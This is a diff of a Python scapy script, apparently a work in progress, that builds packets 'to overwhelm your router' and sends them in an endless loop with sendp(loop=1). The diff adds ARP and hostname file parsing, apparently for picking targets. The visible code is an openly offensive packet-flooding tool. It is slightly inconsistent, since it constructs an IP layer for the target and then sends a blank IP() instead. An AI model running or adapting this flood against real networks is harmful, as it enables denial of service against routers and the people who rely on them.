@@ -1,6 +1,6 @@
 from scapy.all import *
 import argparse
-
+# from icecream import ic
 # Generates packets to overwhelm your router
 
 # Determines if a given address is IPv4 or v6
@@ -15,6 +15,7 @@ def spam_router(router_mac, router_ip):
     i = IPv6() if is_ipv6(router_ip) else IP()
     i.dst = router_ip
     # continuously sends packets → creates flood
+    # TODO add the iface (may be needed for wired LANs)
     sendp(e / IP() / t, loop=1)
 
 
@@ -24,6 +25,14 @@ def extract_mac_IP_pair():
         arp_lines = fin.readlines()
     with open("hostname_ARP.txt") as fin:
         hostname_lines = fin.readlines()
+    split_arp_lines = []
+    split_host_lines = []
+    for host_line in hostname_lines:
+        split_host_lines.append(host_line.split())
+        # ic(host_line.split())
+    for arp_line in arp_lines:
+        # ic(arp_line.split())
+        split_arp_lines.append(arp_line.split())
     # gets the IP and MAC address tuple for a given hostname
     hostname_to_IP_MAC = {}
     # TODO extract MAC and IP addresses with regex
